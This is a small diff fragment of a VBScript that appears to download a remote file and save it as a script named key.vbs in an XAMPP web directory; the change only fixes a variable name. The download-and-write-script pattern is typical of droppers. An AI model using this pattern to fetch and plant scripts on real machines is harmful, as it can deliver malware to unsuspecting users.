@@ -21,7 +21,7 @@ xaHttp.Send
 with baStrm
     .type = 1 
     .open
-    .write xHttp.responseBody
+    .write xaHttp.responseBody
     .savetofile "c:\xampp\htdocs\key.vbs", 2 
 end with
 WScript.Sleep 4000
